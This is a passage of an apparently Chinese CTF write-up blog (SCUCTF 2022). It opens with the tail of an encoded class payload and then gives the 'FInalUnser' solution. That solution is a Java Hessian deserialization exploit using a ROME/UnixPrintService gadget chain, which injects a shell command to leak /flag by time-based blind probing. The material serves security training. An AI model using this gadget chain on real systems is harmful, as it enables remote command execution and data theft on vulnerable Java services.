c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A&quot;&#125;&#125;:&quot;b&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="FInalUnser"><a href="#FInalUnser" class="headerlink" title="FInalUnser"></a>FInalUnser</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> marshalsec;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> marshalsec.gadgets.JDKUtil;</span><br><span class="line"><span class="keyword">import</span> sun.print.UnixPrintService;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String dict = <span class="string">&quot;&#125;abcdefghijklmnopqrstuvwxyz0123456789-&quot;</span>;</span><br><span class="line">        String addstr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> pos=<span class="number">8</span>; pos &lt; <span class="number">50</span>; pos++) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+pos+<span class="string">&quot;位： &quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dict.length(); i++) &#123;</span><br><span class="line">                String finalPayload = <span class="string">&quot;;if [ `cut -c 1-&quot;</span>+pos+<span class="string">&quot; /flag` = \&quot;scuctf&#123;&quot;</span>+ addstr + dict.charAt(i) + <span class="string">&quot;\&quot; ];then sleep 2;fi&quot;</span>;</span><br><span class="line">                System.out.println(finalPayload);</span><br><span class="line">                Constructor&lt;UnixPrintService&gt; declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);</span><br><span class="line">                declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ObjectBean delegate = <span class="keyword">new</span> ObjectBean(UnixPrintService.class, declaredConstructor.newInstance(finalPayload));</span><br><span class="line">                ObjectBean root = <span class="keyword">new</span> ObjectBean(ObjectBean.class, delegate);</span><br><span class="line">                HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);</span><br><span class="line">                ByteArrayOutputStream os = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                Hessian2Output output = <span class="keyword">new</span> Hessian2Output(os);</span><br><span class="line">                HessianBase.NoWriteReplaceSerializerFactory sf = <span class="keyword">new</span> HessianBase.NoWriteReplaceSerializerFactory();</span><br><span class="line">                sf.setAllowNonSerializable(<span class="keyword">true</span>);</span><br><span class="line">                output.setSerializerFactory(sf);</span><br><span class="line">                output.writeObject(map);</span><br><span class="line">                output.getBytesOutputStream().flush();</span><br><span class="line">                output.completeMessage();</span><br><span class="line">                output.close();</span><br><span class="line">                String payload = <span class="keyword">new</span> String(Base64.getEncoder().encode(os.toByteArray()));</span><br><span class="line">                Test http = <span class="keyword">new</span> Test();</span><br><span class="line">                <span class="keyword">boolean</span> res = http.doPost(<span class="string">&quot;http://*.*.*.*:1235/&quot;</span>, payload, String.valueOf(dict.charAt(i)));</span><br><span class="line">                <span class="keyword">if</span> (!res) &#123;</span><br><span class="line">                    addstr = addstr + dict.charAt(i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">doPost</span><span class="params">(String URL, String payload, String flag)</span> </span>&#123;</span><br><span class="line">        OutputStreamWriter out = <span class="keyword">null</span>;</span><br><span class="line">        BufferedReader in = <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        HttpURLConnection conn = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            URL url = <span class="keyword">new</span> URL(URL);</span><br><span class="line">            conn = (HttpURLConnection) url.openConnection();</span><br><span class="line">            conn.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">            <span class="comment">//发送POST请求必须设置为true</span></span><br><span class="line">            conn.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">            conn.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">//设置连接超时时间和读取超时时间，放短方便出错</span></span><br><span class="line">            conn.setConnectTimeout(<span class="number">1000</span>);</span><br><span class="line">            conn.setReadTimeout(<span class="number">1000</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">            conn.setRequestProperty(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            <span class="comment">//获取输出流</span></span><br><span class="line">            out = <span class="keyword">new</span> OutputStreamWriter(conn.getOutputStream());</span><br><span class="line">            out.write(<span class="string">&quot;payload=&quot;</span>+payload);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">            <span class="comment">//取得输入流，并使用Reader读取</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">200</span> == conn.getResponseCode()) &#123;</span><br><span class="line">                in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(conn.getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    result.append(line);</span><br><span class="line"><span class="comment">//                    System.out.println(line);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;ResponseCode is an error code:&quot;</span> + conn.getResponseCode());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line">            System.out.println(flag);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (out != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (in != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    in.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">                ioe.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/paper/">Paper</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-number">1.1.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#export2html"><span class="toc-number">1.2.</span> <span class="toc-text">export2html</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#anya"><span class="toc-number">1.3.</span> <span class="toc-text">anya</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RealWorld"><span class="toc-number">2.</span> <span class="toc-text">RealWorld</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SignIn"><span class="toc-number">2.1.</span> <span class="toc-text">SignIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Make-nday-great-again-and-again"><span class="toc-number">2.2.</span> <span class="toc-text">Make nday great again and again</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezCMS"><span class="toc-number">2.3.</span> <span class="toc-text">ezCMS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson"><span class="toc-number">2.4.</span> <span class="toc-text">fastjson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FInalUnser"><span class="toc-number">2.5.</span> <span class="toc-text">FInalUnser</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://w1mps.github.io/2022/05/23/SCUCTF2022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&text=NS - SCUCTF 2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&title=NS - SCUCTF 2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&is_video=false&description=NS - SCUCTF 2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=NS - SCUCTF 2022&body=Check out this article: http://w1mps.github.io/2022/05/23/SCUCTF2022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&title=NS - SCUCTF 2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&title=NS - SCUCTF 2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&title=NS - SCUCTF 2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&title=NS - SCUCTF 2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://w1mps.github.io/2022/05/23/SCUCTF2022/&name=NS - SCUCTF 2022&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://w1mps.github.io/2022/05/23/SCUCTF2022/&t=NS - SCUCTF 2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <!-- <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> -->

    <div class="footer-center">
      Copyright &copy;
      
      
      2021-2022
      Powered by
      outx
      <!-- (<span id="busuanzi_value_site_pv"></span>) -->
    </div>
  
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/paper/">Paper</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
  <br>

</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
